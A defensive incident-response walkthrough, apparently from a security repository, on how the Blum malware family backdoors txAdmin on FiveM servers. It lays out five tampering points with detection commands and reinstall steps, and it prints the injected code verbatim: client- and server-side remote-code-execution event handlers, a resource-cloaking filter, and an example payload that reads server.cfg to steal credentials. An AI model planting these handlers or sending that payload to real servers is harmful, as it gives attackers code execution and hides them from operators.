# txAdmin Tampering Walkthrough

**If your scanner reports any of these markers, your txAdmin install has been modified by the Blum / Warden / Cipher / GFX Panel family.** This doc walks through the five tampering points, what each one does, what the malicious code looks like in your file, and why the recommended fix is a full txAdmin reinstall rather than line-level edits.

txAdmin is the high-value target. It runs as a privileged FiveM resource and can spawn other resources, restart the server, and act on behalf of any admin. Backdooring it gives the attacker a stable, durable channel into every infected server — even after the original dropper resource has been deleted.

---

## TL;DR — the five tampering points

| # | Marker | File (relative to txAdmin install) | Effect | Removable by hand? |
|---|---|---|---|---|
| 1 | `helpEmptyCode` | `monitor/resource/cl_playerlist.lua` | Client-side RCE via `RegisterNetEvent` | Yes (appended block) |
| 2 | `onServerResourceFail` | `monitor/resource/sv_resources.lua` | **Server-side RCE** via `RegisterNetEvent` + `load()` | Yes (appended block) |
| 3 | `RESOURCE_EXCLUDE`, `isExcludedResource` | `monitor/resource/sv_main.lua` | Resource cloaking — hides attacker resources from the dashboard | **No — inline modification of an existing function** |
| 4 | `JohnsUrUncle` (or unfamiliar admin name) | `txData/admins.json` | Backdoor admin account; full txAdmin control | Yes (delete via UI) |
| 5 | `BLUM_TXADMIN_THEFT_PAYLOAD.lua`-shaped hooks | dropped resource files | Credential exfiltration to C2 | Yes (delete the resource) |

Note the mix of "yes" and "no" in the rightmost column. **That's why the recommended fix is reinstall, not surgery.** Even if you cleanly remove the four removable injections, point 3 leaves your `sv_main.lua` permanently in a non-canonical state that has to be reverted by hand — and you don't have a clean reference to compare against unless you've already downloaded the matching release.

---

## 1. `helpEmptyCode` — client-side RCE

**File**: `monitor/resource/cl_playerlist.lua`

This is the marker most operators find first because it shows up in the client-side script that runs in every connected player's game. The Blum dropper appends an event handler that takes a Lua string from the network and executes it on the player's machine:

```lua
-- INJECTED at the end of cl_playerlist.lua
RegisterNetEvent("helpEmptyCode", function(id)
    local ok, funcOrErr = pcall(load, id)
    if ok and type(funcOrErr) == "function" then
        pcall(funcOrErr)
    end
end)
```

**How the attack works.** `RegisterNetEvent` makes this handler triggerable from the server. The server-side malware uses it to push arbitrary Lua at every connected client. `load()` compiles that string into a function; `pcall()` runs it. The attacker can now do anything the FiveM Lua client API allows on the player's machine.

**Detection (Linux):**
```bash
grep -rn "helpEmptyCode" monitor/resource/cl_playerlist.lua
```

**Detection (Windows PowerShell):**
```powershell
Select-String -Path .\monitor\resource\cl_playerlist.lua -Pattern 'helpEmptyCode'
```

**Removal**: in principle, delete the appended `RegisterNetEvent("helpEmptyCode", ...)` block. In practice, see the bottom of this doc for why you should reinstall.

---

## 2. `onServerResourceFail` — server-side RCE (the dangerous one)

**File**: `monitor/resource/sv_resources.lua`

`onServerResourceFail` is **not** a real FiveM event. It looks like one — it shares the naming convention of `onResourceStart`, `onResourceStop`, etc. — and that's the point. The attacker chose a name that wouldn't catch the eye in a casual review.

```lua
-- INJECTED at the end of sv_resources.lua
RegisterNetEvent("onServerResourceFail")
AddEventHandler("onServerResourceFail", function(luaCode)
    -- load() compiles the string into a Lua function
    -- This accepts ANY valid Lua code: file I/O, os.execute, network calls, etc.
    local fn, err = load(luaCode)
    if not fn then
        -- The ESX notification is camouflage — makes it look like error handling
        return TriggerEvent("esx:showNotification", tostring(err))
    end
    pcall(fn)
end)
```

**Why this is the one that hurts.** `RegisterNetEvent` means **any connected client** can trigger this handler. The handler `load()`s an attacker-supplied Lua string and `pcall()`s it on the server with full server-side privileges. From any infected client (or directly via the C2 if a panel-side connection is open) the attacker can:

- Read or write any file the FXServer process can reach
- Run any shell command via `os.execute` or `io.popen`
- Open arbitrary outbound network connections via `PerformHttpRequest`
- Modify resource files at runtime to plant additional persistence
- Read `server.cfg` (and the RCON password and database credentials it contains)

The `TriggerEvent("esx:showNotification", ...)` line in the error path is camouflage — it makes a quick `grep` reader assume the block is some kind of ESX-related error notifier.

**Detection (Linux):**
```bash
grep -rn "onServerResourceFail" monitor/resource/sv_resources.lua
```

**Detection (Windows PowerShell):**
```powershell
Select-String -Path .\monitor\resource\sv_resources.lua -Pattern 'onServerResourceFail'
```

**Example payload an attacker might send through this channel** (illustrative — do not run):
```lua
-- From any connected client:
TriggerServerEvent("onServerResourceFail", [[
    local f = io.open("/server/data/server.cfg", "r")
    local cfg = f:read("*a")
    f:close()
    -- exfiltrate cfg containing RCON password, DB credentials, etc.
]])
```

**Treat any server that ever ran a tampered `sv_resources.lua` as having had its `server.cfg` exfiltrated.** Rotate `rcon_password`, `sv_licenseKey`, and every database/Discord webhook/bot token referenced anywhere in the file.

---

## 3. `RESOURCE_EXCLUDE` / `isExcludedResource` — resource cloaking

**File**: `monitor/resource/sv_main.lua`

This injection is structurally different from the other two. It's not appended at the end — it's an **inline modification** of an existing legitimate txAdmin function. The attacker added a 70+ entry exclusion list, a helper that checks against it, and a one-line filter inside `txaReportResources` so that any resource matching the exclusion list is hidden from the txAdmin dashboard.

```lua
-- INJECTED block — does not exist in legitimate txAdmin sv_main.lua
local RESOURCE_EXCLUDE = {
    "monitor", "core", "sys", "base", "int", "util",
    "mod", "cfg", "lib", "api", "svc",
    "deps", "ext", "pkg", "env", "proc",
    "log", "db", "net", "sec", "cache",
    "auth", "perm", "role", "user", "acct", "session",
    -- ... 70+ generic names total, including "yarn" and "webpack"
    -- specifically to hide the yarn_builder.js dropper resource
}

local function isExcludedResource(name)
    for _, excluded in ipairs(RESOURCE_EXCLUDE) do
        if name == excluded then return true end
    end
    return false
end

-- TAMPERED: the legitimate txaReportResources does NOT have this filter
local function txaReportResources(source, args)
    local resources = {}
    local max = GetNumResources() - 1
    for i = 0, max do
        local resName = GetResourceByFindIndex(i)
        if resName and not isExcludedResource(resName) then
            -- only resources NOT in the exclusion list are reported
            -- ... rest of the function (unchanged)
        end
    end
end
```

**Why this matters.** With cloaking active, an attacker who creates a resource named `yarn` or `cache` or `webpack` (deliberately chosen generic names from the exclusion list) becomes invisible to the txAdmin dashboard. An operator looking at the resource list sees a normal-looking server. The malicious resources keep running.

**Why surgical removal is hard.** Unlike the other two, this isn't a block you can identify by a single marker line and delete. The attacker:

1. Added a `RESOURCE_EXCLUDE` table.
2. Added an `isExcludedResource` helper function.
3. **Modified an existing function** (`txaReportResources`) to call the helper.

To revert by hand you have to identify every change in `sv_main.lua` — including the inline `if resName and not isExcludedResource(resName) then` line buried inside the function — and undo each one. Without a clean copy of `sv_main.lua` matching your txAdmin version to diff against, you will likely miss something or break the function's semantics.

**Detection (Linux):**
```bash
grep -n "RESOURCE_EXCLUDE\|isExcludedResource" monitor/resource/sv_main.lua
```

**Detection (Windows PowerShell):**
```powershell
Select-String -Path .\monitor\resource\sv_main.lua -Pattern 'RESOURCE_EXCLUDE','isExcludedResource'
```

If `grep` returns *any* matches, the file is tampered. Reinstall.

---

## 4. `JohnsUrUncle` — backdoor admin account

**File**: `txData/admins.json` (path varies by txAdmin profile name)

The dropper adds a txAdmin admin account with the username `JohnsUrUncle`. With a txAdmin admin account, the attacker can:

- Restart the server.
- Start, stop, or refresh resources from the dashboard.
- Read live console output (including RCON commands and any sensitive logging).
- Issue Cfx.re actions tied to the server's Keymaster license.
- Reset other admins' passwords if they have superadmin scope.

Other unfamiliar admin names may also be present — `JohnsUrUncle` is the well-known one but the C2 panel can mint arbitrary admin entries.

**Detection (Linux):**
```bash
grep -rn "JohnsUrUncle" txData/
# Also list every admin account so you can audit unfamiliar ones:
grep -E '"name"\s*:\s*"' txData/admins.json
```

**Detection (Windows PowerShell):**
```powershell
Select-String -Path .\txData\admins.json -Pattern 'JohnsUrUncle' -Recurse
# List every admin (audit unfamiliar names):
(Get-Content .\txData\admins.json -Raw | ConvertFrom-Json) | ForEach-Object { $_.name }
```

**Removal**:
1. Back up `admins.json` for evidence first.
2. Sign in to the txAdmin web UI with a legitimate admin account.
3. Delete every admin you do not personally recognise, not just `JohnsUrUncle`.
4. Rotate the password on every legitimate admin account afterwards (the attacker may have read the password hashes).

---

## 5. `BLUM_TXADMIN_THEFT_PAYLOAD.lua` — credential exfiltration

**File**: dropped as a resource (path varies per infection)

The Blum dropper plants a Lua payload that reads txAdmin's config and admin files and exfiltrates them to the C2. Even if the four other tampering points are caught and removed, this resource may have already exfiltrated the operator's credentials. Treat any txAdmin config that ever existed on an infected server as compromised.

**Detection** (Linux):
```bash
find . -name "BLUM_TXADMIN_THEFT_PAYLOAD.lua" -o -name "*.lua" -exec grep -l "txData/admins.json\|txData/config.json" {} \; 2>/dev/null
```

**Detection** (Windows PowerShell):
```powershell
Get-ChildItem -Recurse -Filter '*.lua' | Select-String 'txData[\\/]admins\.json|txData[\\/]config\.json'
```

The presence of any non-txAdmin Lua file referencing `txData/admins.json` is a strong signal. Quarantine and review.

---

## Why a full reinstall is the recommended fix

The txAdmin tampering set has three properties that make manual remediation unreliable:

1. **Mixed injection styles.** Two of the five points (helpEmptyCode and onServerResourceFail) are append-only and removable. One (RESOURCE_EXCLUDE in sv_main.lua) is an inline modification of an existing function and requires a known-clean reference to revert correctly.
2. **Multiple redundant footholds.** If you remove only the markers you find with `grep`, you may miss variants. The malware family has rotated minor markers in the past and may be doing so now.
3. **You don't know what you don't know.** Surgery requires a complete inventory of injections. The five points above are what's been identified; an attacker with persistent access could have added anything else on top.

The supply of safe assumptions runs out quickly. A clean reinstall of the matching txAdmin release version replaces every known and unknown injection in the monitor scripts in one shot, and is faster than line-level surgery in any case.

---

## Recommended remediation procedure

```
[ ] 1. Note the installed txAdmin version. Visit the txAdmin web UI -> About,
       or check the version string in monitor/citizen/system_resources/...
       Copy the exact version (e.g. "v8.0.4" or "v7.4.3").

[ ] 2. Stop the FiveM server. Use the txAdmin "Shutdown" action, or kill
       FXServer.exe directly. Do NOT continue running the server while
       remediating; the attacker has live execution and may re-inject.

[ ] 3. Back up txData/ for evidence. Copy the entire txData/ directory to a
       safe location before changing anything. You will need admins.json for
       audit; you may need config.json for reference.

[ ] 4. Download the matching txAdmin release. Go to:
         https://github.com/tabarra/txAdmin/releases
       Find the tag matching your installed version. Download the release
       artefact (txAdmin.zip or equivalent). Do NOT clone master / main —
       the project has been restructured and master will not match older
       installations.

[ ] 5. Replace the monitor directory. Delete the existing monitor/ directory
       entirely. Extract the release archive's monitor/ on top of where the
       old one was. Do NOT keep any pre-existing files.

[ ] 6. Restore txData/admins.json with a clean copy. Either delete admins.json
       so txAdmin re-prompts you to set up an admin on first launch, or
       open the backed-up admins.json and remove every admin you do not
       personally recognise (especially JohnsUrUncle and any unfamiliar
       names).

[ ] 7. Hunt and remove any Blum-family resources that may have been planted.
       Run detection/scan.sh (Linux) or
       detection/blum_windows.ps1 -Action Scan (Windows) against the FiveM
       resources directory. Quarantine anything it flags.
       Linux: detection/scan.sh /path/to/server-data
       Windows: .\detection\blum_windows.ps1 -Action Remediate -Path C:\FXServer\server-data -Apply

[ ] 8. Audit Cfx.re Keymaster license. Sign in to https://keymaster.fivem.net,
       check active licenses, revoke and regenerate sv_licenseKey for this
       server.

[ ] 9. Rotate every credential listed in the rotation reference card in
       docs/BLAST_RADIUS.md. At minimum:
         - txAdmin admin passwords (every one)
         - rcon_password (server.cfg)
         - sv_licenseKey (Cfx.re Keymaster)
         - Database user passwords used by FiveM
         - Every Discord webhook URL and bot token referenced in any resource
         - Framework admin passwords (ESX/QBCore/etc.)

[ ] 10. Verify. Restart the server. Re-run the scanner. Confirm no markers
        appear. Confirm the txAdmin admin list contains only people you
        recognise. Confirm the resource list (in txAdmin and via
        GetResourceByFindIndex) matches what you expect.

[ ] 11. Read docs/BLAST_RADIUS.md for the broader rebuild guidance covering
        the Windows host, Linux host, or container in which FXServer was
        running.
```

A clean scanner run at step 10 confirms the *files* are clean. It does not confirm the *machine* is trustworthy — that's the rebuild and credential-rotation work in `BLAST_RADIUS.md`.

---

## Reference

The annotated, deobfuscated source for each tampering point is published in this repository:

- `deobfuscated/deobfuscated_sv_main.lua` — full annotated `sv_main.lua` with the resource-cloaking injection highlighted
- `deobfuscated/deobfuscated_sv_resources.lua` — full annotated `sv_resources.lua` with the `onServerResourceFail` RCE handler
- `deobfuscated/BLUM_TXADMIN_THEFT_PAYLOAD.lua` — full credential-theft Lua payload
- `deobfuscated/c2_payload.js` (lines around the `CLIENT_BACKDOOR_LUA` definition) — the JS that performs the injection and stores the marker check

If you find new markers or new tampering points not listed here, please open an issue using the [New IOC Report template](../../../issues/new?template=new-ioc.md) or the [Scanner Findings template](../../../issues/new?template=scanner-findings.md). The attacker family rotates strings periodically; community signal is the fastest way to keep this doc current.

## Runtime defense (during and after cleanup)

`dropper_trap/` (deployed as a FiveM resource and loaded *first* in your `resources.cfg`) provides runtime defenses that catch new variants of the txAdmin tampering pattern even when marker strings change:

- **Behavioral file-write block.** Any write to `monitor/resource/cl_playerlist.lua`, `sv_main.lua`, or `sv_resources.lua` from a resource other than `monitor` itself is blocked, regardless of what the malicious content looks like.
- **Shadow-registered backdoor events.** `onServerResourceFail`, `txadmin:js_create`, and `helpEmptyCode` are pre-registered with handlers that `CancelEvent()` immediately — so even if the family ships a variant with the same event names, the malicious handler can't run.
- **Manifest watcher.** Every resource's `fxmanifest.lua` is hashed at first sight; runtime changes are reported. Catches manifest-injection attacks.

Deploy `dropper_trap/` always, not just after an incident. See [`docs/HARDENING.md`](HARDENING.md) for the full defense-in-depth playbook.

---

## See also

- [`docs/BLAST_RADIUS.md`](BLAST_RADIUS.md) — what to rotate and rebuild after this kind of compromise (depends on whether FXServer ran in a container, on a Linux host, or directly on Windows)
- [`docs/HARDENING.md`](HARDENING.md) — defense-in-depth playbook to avoid the next infection
- [`dropper_trap/`](../dropper_trap) — FiveM-side runtime trap with behavioral defenses against this family
- [`iocs/blum_iocs.json`](../iocs/blum_iocs.json) — canonical IOC inventory; the txAdmin tampering markers list lives in the `txadmin_tampering` section
